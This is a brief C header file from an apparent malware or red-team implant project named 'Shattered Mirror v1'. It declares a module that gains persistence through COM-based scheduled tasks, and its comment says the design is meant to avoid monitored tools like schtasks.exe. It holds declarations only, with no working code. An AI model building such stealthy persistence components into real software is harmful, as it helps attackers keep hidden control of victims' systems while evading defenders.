#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Atom 07: COM Persistence
 *
 * Establishes persistence via COM-based Task Scheduler API, avoiding
 * highly monitored command-line executions like schtasks.exe.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_07_PERSIST_H
#define SMIRROR_ATOM_07_PERSIST_H

#include <windows.h>

/* Launch the persistence thread */
DWORD WINAPI PersistenceAtomMain(LPVOID lpParam);

/* Internal COM helper */
BOOL CreateScheduledTaskCOM(LPCWSTR pwszTaskName, LPCWSTR pwszExecutablePath);

#endif /* SMIRROR_ATOM_07_PERSIST_H */
